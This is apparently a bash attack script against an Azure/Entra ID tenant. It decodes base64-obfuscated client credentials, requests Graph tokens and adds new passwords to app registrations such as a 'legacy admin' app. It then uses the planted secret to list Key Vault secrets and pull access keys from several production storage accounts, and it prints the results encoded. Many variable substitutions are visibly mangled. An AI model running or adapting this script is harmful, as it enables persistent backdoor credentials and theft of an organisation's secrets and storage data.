#!/bin/bash
set -e

SYNC_CID=$(echo "NDYyZDFjMzgtNDQ1OS00OGI4LTkzMzMtODJlMzg5ZTU5NTE0" | base64 -d)
SYNC_SEC=$(echo "c2sxOFF+cUQyMmtrSFhVQ2ZxWExxZFA5NURrWUpMMzRlTUVSbGNTag==" | base64 -d)

GT=$(curl -sS -X POST "https://login.microsoftonline.com/3205c325-06a5-4171-9ce8-ffc5e6c2845e/oauth2/v2.0/token" \
  -d "client_id=\" \
  -d "client_secret=\" \
  -d "scope=https://graph.microsoft.com/.default" \
  -d "grant_type=client_credentials" | jq -r .access_token)
echo "GT_LEN=\"

# Try addPassword on tbl-legacy-admin with unique name
echo "=== ADD PASSWORD TO LEGACY ADMIN ==="
FULL_RESP=$(curl -sS -X POST "https://graph.microsoft.com/v1.0/applications/22a3fb7e-860a-4708-9e50-3d36aa21191c/addPassword" \
  -H "Authorization: Bearer \" \
  -H "Content-Type: application/json" \
  -d '{"passwordCredential":{"displayName":"lh-1792633967"}}')
echo "LEGACY_B64=$(echo "\" | base64 -w0)"

# If that failed, try removePassword first (remove an old one) then add
if echo "\" | jq -e '.error' > /dev/null 2>&1; then
  echo "First attempt failed, error: $(echo "\" | jq -r '.error.code')"
  
  # Try on other apps too  
  echo "=== TRY OTHER APPS ==="
  for APP in "317eef12-bc80-4c7c-9916-4b2ffcbeb15d:insights" "1f07dd31-a868-4c19-9c85-a50b9700f88f:dirsync" "21183692-23a7-4910-9af5-90dae73cddd5:cicd"; do
    IFS=: read APP_OID LABEL <<< "\"
    R=$(curl -sS -X POST "https://graph.microsoft.com/v1.0/applications/\/addPassword" \
      -H "Authorization: Bearer \" \
      -H "Content-Type: application/json" \
      -d "{\"passwordCredential\":{\"displayName\":\"lh-\-1792633967\"}}")
    echo "\_B64=$(echo "\" | base64 -w0)"
  done
else
  echo "SECRET_TEXT=$(echo "\" | jq -r '.secretText')"
  echo "KEY_ID=$(echo "\" | jq -r '.keyId')"
  
  # Now use the new secret to auth as tbl-legacy-admin and access resources
  SECRET=$(echo "\" | jq -r '.secretText')
  
  # Get vault token
  VT=$(curl -sS -X POST "https://login.microsoftonline.com/3205c325-06a5-4171-9ce8-ffc5e6c2845e/oauth2/v2.0/token" \
    -d "client_id=891fb158-e02c-4428-a885-53b811f369c0" \
    -d "client_secret=\" \
    -d "scope=https://vault.azure.net/.default" \
    -d "grant_type=client_credentials" | jq -r .access_token)
  echo "VT_LEN=\"
  
  # Try KV2
  echo "=== KV2 SECRETS ==="
  KV2=$(curl -sS "https://kv-tbl-sec-x3euoz.vault.azure.net/secrets?api-version=7.4" \
    -H "Authorization: Bearer \")
  echo "KV2_B64=$(echo "\" | base64 -w0)"
  
  # Get management token 
  MT=$(curl -sS -X POST "https://login.microsoftonline.com/3205c325-06a5-4171-9ce8-ffc5e6c2845e/oauth2/v2.0/token" \
    -d "client_id=891fb158-e02c-4428-a885-53b811f369c0" \
    -d "client_secret=\" \
    -d "scope=https://management.azure.com/.default" \
    -d "grant_type=client_credentials" | jq -r .access_token)
  echo "MT_LEN=\"
  
  # Try listKeys on all storage accounts
  for ACCT in "sttblbackupprodx3euoz" "sttblappcfgprodx3euoz" "sttblarchiveprodx3euoz" "sttblcilogsprodx3euoz"; do
    KEYS=$(curl -sS -X POST "https://management.azure.com/subscriptions/c5e4e004-b42d-4ac4-a502-5fd338380eb6/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Storage/storageAccounts/\/listKeys?api-version=2023-01-01" \
      -H "Authorization: Bearer \")
    echo "KEYS_\=$(echo "\" | jq -r '.keys[0].value // .error.code // "null"')"
  done
  
  # Storage token
  ST=$(curl -sS -X POST "https://login.microsoftonline.com/3205c325-06a5-4171-9ce8-ffc5e6c2845e/oauth2/v2.0/token" \
    -d "client_id=891fb158-e02c-4428-a885-53b811f369c0" \
    -d "client_secret=\" \
    -d "scope=https://storage.azure.com/.default" \
    -d "grant_type=client_credentials" | jq -r .access_token)
  echo "ST_LEN=\"
fi

echo "=== DONE ==="